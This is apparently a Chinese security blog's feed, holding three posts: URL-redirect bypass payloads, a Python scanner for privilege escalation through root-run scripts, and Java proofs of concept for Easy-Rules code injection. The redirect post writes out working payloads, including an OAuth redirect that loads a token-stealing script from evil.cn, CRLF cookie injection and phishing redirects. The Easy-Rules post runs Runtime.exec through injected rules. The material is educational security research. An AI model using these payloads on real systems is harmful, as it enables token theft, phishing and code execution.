title="通过xip.io解析到内网绕过"></a>通过xip.io解析到内网绕过</h3><p>这个就不用多介绍了，例如10.0.0.1这个内网IP地址是和以下几种形式的域名等价的：</p><ul><li>10.0.0.1.xip.io</li><li><a href="http://www.10.0.0.1.xip.io" target="_blank" rel="noopener">www.10.0.0.1.xip.io</a></li><li>mysite.10.0.0.1.xip.io</li><li>foo.bar.10.0.0.1.xip.io</li></ul><h3 id="利用IPv6绕过"><a href="#利用IPv6绕过" class="headerlink" title="利用IPv6绕过"></a>利用IPv6绕过</h3><blockquote><p>有些服务没有考虑IPv6的情况，但是内网又支持IPv6，则可以使用IPv6的本地IP如 <code>[::]</code> <code>0000::1</code>或IPv6的内网域名来绕过过滤。</p></blockquote><h2 id="0x0D-多重验证-amp-跳转绕过"><a href="#0x0D-多重验证-amp-跳转绕过" class="headerlink" title="0x0D 多重验证&amp;跳转绕过"></a>0x0D 多重验证&amp;跳转绕过</h2><p>除了直接跳转到目标网站外，还可以利用多重URL跳转达到访问目标站点的目的。</p><p>比如存在URL为<code>http://www.mi1k7ea.com/redirect?url=xxx</code>，可以修改最后面的url来达到任意URL跳转，比如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.mi1k7ea.com/redirect?url=http://login.mi1k7ea.com/abc?url=http://www.evil.cn</span><br></pre></td></tr></table></figure><p>结合可信域的URL重定向，将url参数配置成一个重定向地址：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://api.weibo.com/oauth2/authorize?client_id=24666666&amp;response_type=code&amp;state=XXXX&amp;scope=&amp;display=&amp;redirect_uri=http://auth.app.com/redirect.php?url=http://www.evil.cn</span><br></pre></td></tr></table></figure><h2 id="0x0E-漏洞组合拳绕过"><a href="#0x0E-漏洞组合拳绕过" class="headerlink" title="0x0E 漏洞组合拳绕过"></a>0x0E 漏洞组合拳绕过</h2><p>通过漏洞组合拳也能进行绕过。</p><h3 id="URL重定向-XSS"><a href="#URL重定向-XSS" class="headerlink" title="URL重定向+XSS"></a>URL重定向+XSS</h3><p>如下示例，可组合用于窃取token：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://api.weibo.com/oauth2/authorize?client_id=24666666&amp;response_type=code&amp;state=XXXX&amp;scope=&amp;display=&amp;redirect_uri=http://app.com/ajax/cat.html?callback=&lt;script src=&quot;http://evil.cn/getToken.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="URL重定向-CRLF注入"><a href="#URL重定向-CRLF注入" class="headerlink" title="URL重定向+CRLF注入"></a>URL重定向+CRLF注入</h3><p>URL重定向通常是用过响应头中Location进行参数指定，当未对跳转参数做判断时，可能导致CRLF注入漏洞。</p><p>比如，给用户CRLF注入一个session，可以造成会话固定攻击（当然，前提是网站本身存在会话固定漏洞）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://app.com/redirect?url=http://www.baidu.com/login%0d%0aSet-Cookie:JSESSID=hacked</span><br></pre></td></tr></table></figure><p>也可以将恶意JS代码插入响应报文的body中，造成反射型XSS：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://app.com/redirect?url=%0d%0a%0d%0a&lt;img src=x onerror=alert(0)&gt;</span><br></pre></td></tr></table></figure><p>此外，多数情况下浏览器Filter会缓解XSS即<code>X-XSS-Protection=1</code>，但是我们可以通过CRLF注入来设置响应头来关闭掉该浏览器的保护策略：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://app.com/redirect?url=%0d%0aX-XSS-Protection=0%0d%0a%0d%0a&lt;img src=x onerror=alert(0)&gt;</span><br></pre></td></tr></table></figure><h2 id="0x0F-一些特殊的URL"><a href="#0x0F-一些特殊的URL" class="headerlink" title="0x0F 一些特殊的URL"></a>0x0F 一些特殊的URL</h2><h3 id="待跳转地址是URL路径的一部分"><a href="#待跳转地址是URL路径的一部分" class="headerlink" title="待跳转地址是URL路径的一部分"></a>待跳转地址是URL路径的一部分</h3><p><strong>Demo1</strong></p><p>比如<code>http://a.app.com</code>子域名存在一个形如<code>http://a.app.com/gate/jmp/域名</code>的跳转，但由于未对跳转的URL进行过滤，导致存在任意URL跳转漏洞。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://a.app.com/gate/jmp/www.evil.cn</span><br></pre></td></tr></table></figure><p><strong>Demo2</strong></p><p>比如，通过这个URL可跳转到任意站点：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://jp.rd.yahoo.com/SIG=af9o12ru/D=maps/Y=YAHOO/EXP=1288888888/*任意URL</span><br></pre></td></tr></table></figure><p>钓鱼：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://jp.rd.yahoo.com/SIG=af9o12ru/D=maps/Y=YAHOO/EXP=1288888888/*http://www.evil.cn</span><br></pre></td></tr></table></figure><h3 id="通过富文本插入HTML代码进行跳转"><a href="#通过富文本插入HTML代码进行跳转" class="headerlink" title="通过富文本插入HTML代码进行跳转"></a>通过富文本插入HTML代码进行跳转</h3><p>很多网站都是有留言/评论功能的，并且支持切换到HTML格式。</p><p>攻击者可以在留言的时候转换到HTML状态下插入<code>&lt;iframe src=&quot;&quot;&gt;&lt;/iframe&gt;</code>标签代码，在src属性中指定一个swf文件，比如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"http://mi1k7ea.com/a.html"</span> <span class="attr">frameborder</span>=<span class="string">"0"</span> <span class="attr">width</span>=<span class="string">"100"</span> <span class="attr">scrolling</span>=<span class="string">"yes"</span> <span class="attr">height</span>=<span class="string">"100"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure><p>其中a.html代码为<code>&lt;embed src=&quot;a.swf&quot; width=100 height=100&gt;&lt;/embed&gt;</code>，从而完成一次URL跳转。</p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Web安全基础" scheme="https://www.mi1k7ea.com/categories/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="URL" scheme="https://www.mi1k7ea.com/tags/URL/"/>
    
  </entry>
  
  <entry>
    <title>Python安全小工具之脚本提权扫描</title>
    <link href="https://www.mi1k7ea.com/2020/04/12/Python%E5%AE%89%E5%85%A8%E5%B0%8F%E5%B7%A5%E5%85%B7%E4%B9%8B%E8%84%9A%E6%9C%AC%E6%8F%90%E6%9D%83%E6%89%AB%E6%8F%8F/"/>
    <id>https://www.mi1k7ea.com/2020/04/12/Python安全小工具之脚本提权扫描/</id>
    <published>2020-04-12T12:39:56.000Z</published>
    <updated>2020-04-13T13:35:28.626Z</updated>
    
    <content type="html"><![CDATA[<h2 id="脚本提权类问题"><a href="#脚本提权类问题" class="headerlink" title="脚本提权类问题"></a>脚本提权类问题</h2><p>脚本提权类问题，大致分为两种：</p><ol><li>root等高权限用户会去执行的脚本，低权限用户对该脚本拥有写权限，将导致低权限用户输入的命令被高权限执行；</li><li>以root等高权限用户作为属主的脚本中，低权限用户对该脚本未拥有写权限，但是该脚本中调用了低权限用户拥有写权限的脚本也会导致提权；</li></ol><h2 id="扫描脚本1"><a href="#扫描脚本1" class="headerlink" title="扫描脚本1"></a>扫描脚本1</h2><p>该脚本原理比较简单，针对前面说的第二点脚本提权类问题，就是全局搜索属主为root的sh文件，然后循环遍历其中的文件内容是否存在调用属主为其他用户的脚本，若有则判定为存在脚本提权问题。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(path, highuser, lowuser)</span>:</span></span><br><span class="line">    cmd1 = <span class="string">"find "</span> + path + <span class="string">" -name \"*.sh\" -user "</span> + highuser + <span class="string">" 2&gt;/dev/null"</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[*]Running command: "</span> + cmd1</span><br><span class="line">    result = os.popen(cmd1).read()</span><br><span class="line">    files = result.split(<span class="string">"\n"</span>)</span><br><span class="line">    <span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(file):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            f = open(file, <span class="string">"r"</span>)</span><br><span class="line">            flag = <span class="number">0</span></span><br><span class="line">            scriptname = <span class="string">""</span></span><br><span class="line">            <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">                content = line.split()</span><br><span class="line">                <span class="keyword">for</span> c <span class="keyword">in</span> content:</span><br><span class="line">                    <span class="keyword">if</span> c.endswith(<span class="string">".sh"</span>):</span><br><span class="line">                        name = os.path.basename(c)</span><br><span class="line">                        cmd2 = <span class="string">"find / -name "</span> + name + <span class="string">" -user "</span> + lowuser + <span class="string">" 2&gt;/dev/null"</span></span><br><span class="line">                        <span class="keyword">print</span> <span class="string">"[*]Running command: "</span> + cmd2</span><br><span class="line">                        result = os.popen(cmd2).read()</span><br><span class="line">                        <span class="keyword">if</span> result.find(name) != <span class="number">-1</span>:</span><br><span class="line">                            flag = <span class="number">1</span></span><br><span class="line">                            scriptname = name</span><br><span class="line">                            <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">if</span> flag == <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> flag == <span class="number">1</span>:</span><br><span class="line">                output = <span class="string">"[+]Found Root Script:"</span> + file + <span class="string">"\n[!]Check:["</span> + scriptname + <span class="string">"]\n\n"</span></span><br><span class="line">                <span class="keyword">print</span> output</span><br><span class="line">                <span class="keyword">with</span> open(<span class="string">"scan_result.txt"</span>, <span class="string">"a"</span>) <span class="keyword">as</span> rfile:</span><br><span class="line">                    rfile.write(output)</span><br><span class="line">                scriptname = <span class="string">""</span></span><br><span class="line">                flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">except</span> IOError <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"[-]Error: "</span> + file + <span class="string">" | "</span> + e</span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">            <span class="keyword">if</span> f:</span><br><span class="line">                f.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) != <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"[*]Usage: python RootScriptScan.py [Dir Path] [High Privilege Username] [Low Privilege Username]"</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        scan(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>], sys.argv[<span class="number">3</span>])</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"[*]Finished."</span></span><br></pre></td></tr></table></figure><p>该脚本需要输入三个参数，分别是扫描的目录位置、高权限用户名和低权限用户名。</p><p>扫描效果：</p><p><img src="/2020/04/12/Python安全小工具之脚本提权扫描/1.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Python" scheme="https://www.mi1k7ea.com/categories/Python/"/>
    
      <category term="Python安全开发" scheme="https://www.mi1k7ea.com/categories/Python/Python%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="安全开发" scheme="https://www.mi1k7ea.com/tags/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/"/>
    
      <category term="Python" scheme="https://www.mi1k7ea.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>浅析Easy-Rules代码注入漏洞</title>
    <link href="https://www.mi1k7ea.com/2020/04/12/%E6%B5%85%E6%9E%90Easy-Rules%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
    <id>https://www.mi1k7ea.com/2020/04/12/浅析Easy-Rules代码注入漏洞/</id>
    <published>2020-04-12T03:01:45.000Z</published>
    <updated>2020-04-12T11:58:32.531Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><p>Easy-Rules是一个简单的Java开源规则引擎，它提供了规则抽象来创建带有评估条件和执行操作的规则，规则引擎API通过运行一组规则以评估条件和执行操作。最新版同时支持MvEL和SpEL表达式语句的规则编写。</p><p>特点：</p><ul><li>轻量级类库和容易上手</li><li>基于POJO的开发与注解的编程模型</li><li>基于MVEL表达式的编程模型（适用于极简单的规则，一般不推荐）</li><li>支持根据简单的规则创建组合规则</li><li>方便且适用于java的抽象的业务模型规则</li></ul><h2 id="0x02-基本语法"><a href="#0x02-基本语法" class="headerlink" title="0x02 基本语法"></a>0x02 基本语法</h2><p>参考：<a href="https://github.com/j-easy/easy-rules" target="_blank" rel="noopener">https://github.com/j-easy/easy-rules</a></p><p>MvEL模块语法同MvEL，SpEL模块语法同SpEL。</p><p>定义规则的几种方法：</p><ul><li>注解方式定义规则；</li><li>流式编程方式定义规则；</li><li>表达式方式定义规则；</li><li>文件方式定义规则（yml或json）；</li></ul><p>注意：外部可控的情况一般是后面三种，因为第一种一般是写死在代码中了。</p><h2 id="0x03-PoC"><a href="#0x03-PoC" class="headerlink" title="0x03 PoC"></a>0x03 PoC</h2><p>需要的jar包：easy-rules-core-3.4.0、easy-rules-mvel-3.4.0、easy-rules-support-3.4.0、easy-rules-spel-3.4.0、commons-logging-1.2、snakeyaml-1.25、mvel2-2.4.4.Final、slf4j-api-1.7.30、slf4j-nop-1.7.30、spring-core-5.0.2.RELEASE、spring-expression-5.0.2.RELEASE、jackson-annotations-2.7.9、jackson-core-2.7.9、jackson-databind-2.7.9。</p><h3 id="注解方式定义规则的注入"><a href="#注解方式定义规则的注入" class="headerlink" title="注解方式定义规则的注入"></a>注解方式定义规则的注入</h3><p>这里调用RulesEngine.fire()执行规则，规则的定义是在ExpRule类中通过注解的方式定义的，而该类一般是写死的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.jeasy.rules.api.Facts;</span><br><span class="line"><span class="keyword">import</span> org.jeasy.rules.api.Rules;</span><br><span class="line"><span class="keyword">import</span> org.jeasy.rules.api.RulesEngine;</span><br><span class="line"><span class="keyword">import</span> org.jeasy.rules.core.DefaultRulesEngine;</span><br><span class="line"><span class="keyword">import</span> org.jeasy.rules.core.RulesEngineParameters;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        RulesEngineParameters rulesEngineParameters = <span class="keyword">new</span> RulesEngineParameters().skipOnFirstAppliedRule(<span class="keyword">true</span>);</span><br><span class="line">        RulesEngine rulesEngine = <span class="keyword">new</span> DefaultRulesEngine(rulesEngineParameters);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建规则</span></span><br><span class="line">        Rules rules = <span class="keyword">new</span> Rules();</span><br><span class="line">        rules.register(<span class="keyword">new</span> ExpRule());</span><br><span class="line"></span><br><span class="line">        Facts facts = <span class="keyword">new</span> Facts();</span><br><span class="line">        <span class="comment">// 规则因素，对应的name，要和规则里面的@Fact一致</span></span><br><span class="line">        facts.put(<span class="string">"name"</span>, <span class="string">"mi1k7ea"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 执行规则</span></span><br><span class="line">        rulesEngine.fire(rules, facts);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同时，新建ExpRule类，使用注解方式定义规则和执行方法，这里我们在@Action注解即执行方法注解中写入执行弹计算器的恶意代码，当判断我们设置的规则facts中name对应的值为”mi1k7ea”时即可触发：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.jeasy.rules.annotation.*;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Rule</span>(name = <span class="string">"exp"</span>, description = <span class="string">"Exp Test"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExpRule</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 条件判断注解，如果return true则执行Action</span></span><br><span class="line">    <span class="meta">@Condition</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isMi1k7ea</span><span class="params">(@Fact(<span class="string">"name"</span>)</span> String name) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name == <span class="string">"mi1k7ea"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 执行方法注解</span></span><br><span class="line">    <span class="meta">@Action</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">mi1k7eaAction</span><span class="params">(@Fact(<span class="string">"name"</span>)</span> String name) <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        System.out.println(name + <span class="string">" is ok"</span>);</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">"calc"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 优先级注解，return数值越小，优先级越高</span></span><br><span class="line">    <span class="meta">@Priority</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getPriority</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行即可触发：</p><p><img src="/2020/04/12/浅析Easy-Rules代码注入漏洞/1.png" alt=""></p><h3 id="流式编程方式定义规则的注入"><a href="#流式编程方式定义规则的注入" class="headerlink" title="流式编程方式定义规则的注入"></a>流式编程方式定义规则的注入</h3><p>代码逻辑和前面是一样的，只不过是以流式编程方式来定义规则而已，注入点关键在于流式编程的规则我们是可以直接输入的，比如then部分语句输入恶意执行代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.jeasy.rules.api.Facts;</span><br><span class="line"><span class="keyword">import</span> org.jeasy.rules.api.Rule;</span><br><span class="line"><span class="keyword">import</span> org.jeasy.rules.api.Rules;</span><br><span class="line"><span class="keyword">import</span> org.jeasy.rules.api.RulesEngine;</span><br><span class="line"><span class="keyword">import</span> org.jeasy.rules.core.DefaultRulesEngine;</span><br><span class="line"><span class="keyword">import</span> org.jeasy.rules.core.RuleBuilder;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Rule rule = <span class="keyword">new</span> RuleBuilder()</span><br><span class="line">                .name(<span class="string">"exp"</span>)</span><br><span class="line">                .description(<span class="string">"Exp Test"</span>)</span><br><span class="line">                .when(facts -&gt; facts.get(<span class="string">"name"</span>).equals(<span class="string">"mi1k7ea"</span>))</span><br><span class="line">                .then(facts -&gt; java.lang.Runtime.getRuntime().exec(<span class="string">"calc"</span>))</span><br><span class="line">                .build();</span><br><span class="line"></span><br><span class="line">        Rules rules = <span class="keyword">new</span> Rules();</span><br><span class="line">        rules.register(rule);</span><br><span class="line"></span><br><span class="line">        Facts facts = <span class="keyword">new</span> Facts();</span><br><span class="line">        facts.put(<span class="string">"name"</span>, <span class="string">"mi1k7ea"</span>);</span><br><span class="line"></span><br><span class="line">        RulesEngine rulesEngine = <span class="keyword">new</span> DefaultRulesEngine();</span><br><span class="line">        rulesEngine.fire(rules, facts);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行即可触发：</p><p><img src="/2020/04/12/浅析Easy-Rules代码注入漏洞/2.png" alt=""></p><h3 id="表达式方式定义规则的注入"><a href="#表达式方式定义规则的注入" class="headerlink" title="表达式方式定义规则的注入"></a>表达式方式定义规则的注入</h3><p>和前面的区别在于用到了MvEL模板来实现MvEL表达式方式定义规则即MVELRule，注入点就在表达式中，当然除了在then语句中注入也能在when语句中注入：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.jeasy.rules.api.Facts;</span><br><span class="line"><span class="keyword">import</span> org.jeasy.rules.api.Rule;</span><br><span class="line"><span class="keyword">import</span> org.jeasy.rules.api.Rules;</span><br><span class="line"><span class="keyword">import</span> org.jeasy.rules.api.RulesEngine;</span><br><span class="line"><span class="keyword">import</span> org.jeasy.rules.core.DefaultRulesEngine;</span><br><span class="line"><span class="keyword">import</span> org.jeasy.rules.mvel.MVELRule;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 表达式方式定义规则</span></span><br><span class="line">        Rule rule = <span class="keyword">new</span> MVELRule()</span><br><span class="line">                .name(<span class="string">"exp"</span>)</span><br><span class="line">                .description(<span class="string">"Exp Test"</span>)</span><br><span class="line">                .priority(<span class="number">1</span>)</span><br><span class="line">                .when(<span class="string">"true"</span>)</span><br><span class="line">                .then(<span class="string">"java.lang.Runtime.getRuntime().exec('calc');"</span>);</span><br><span class="line"></span><br><span class="line">        Rules rules = <span class="keyword">new</span> Rules();</span><br><span class="line">        rules.register(rule);</span><br><span class="line"></span><br><span class="line">        Facts facts = <span class="keyword">new</span> Facts();</span><br><span class="line"></span><br><span class="line">        RulesEngine rulesEngine = <span class="keyword">new</span> DefaultRulesEngine();</span><br><span class="line">        rulesEngine.fire(rules, facts);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行即可触发：</p><p><img src="/2020/04/12/浅析Easy-Rules代码注入漏洞/3.png" alt=""></p><h3 id="文件方式定义规则（yml或json）的注入"><a href="#文件方式定义规则（yml或json）的注入" class="headerlink" title="文件方式定义规则（yml或json）的注入"></a>文件方式定义规则（yml或json）的注入</h3><p>同样需要MvEL模板环境，只是不同文件类型有细微的区别而已，注入点在加载的文件中：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.jeasy.rules.api.Facts;</span><br><span class="line"><span class="keyword">import</span> org.jeasy.rules.api.Rule;</span><br><span class="line"><span class="keyword">import</span> org.jeasy.rules.api.Rules;</span><br><span class="line"><span class="keyword">import</span> org.jeasy.rules.api.RulesEngine;</span><br><span class="line"><span class="keyword">import</span> org.jeasy.rules.core.DefaultRulesEngine;</span><br><span class="line"><span class="keyword">import</span> org.jeasy.rules.mvel.MVELRuleFactory;</span><br><span class="line"><span class="keyword">import</span> org.jeasy.rules.support.YamlRuleDefinitionReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// json文件方式定义规则</span></span><br><span class="line"><span class="comment">//        MVELRuleFactory mvelRuleFactory = new MVELRuleFactory(new JsonRuleDefinitionReader());</span></span><br><span class="line"><span class="comment">//        Rule rule = mvelRuleFactory.createRule(new FileReader("easy-rules.json"));</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// yml文件方式定义规则</span></span><br><span class="line">        MVELRuleFactory mvelRuleFactory = <span class="keyword">new</span> MVELRuleFactory(<span class="keyword">new</span> YamlRuleDefinitionReader());</span><br><span class="line">        Rule rule = mvelRuleFactory.createRule(<span class="keyword">new</span> FileReader(<span class="string">"easy-rules.yml"</span>));</span><br><span class="line"></span><br><span class="line">        Rules rules = <span class="keyword">new</span> Rules();</span><br><span class="line">        rules.register(rule);</span><br><span class="line"></span><br><span class="line">        Facts facts = <span class="keyword">new</span> Facts();</span><br><span class="line"></span><br><span class="line">        RulesEngine rulesEngine = <span class="keyword">new</span> DefaultRulesEngine();</span><br><span class="line">        rulesEngine.fire(rules, facts);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行即可触发：</p><p><img 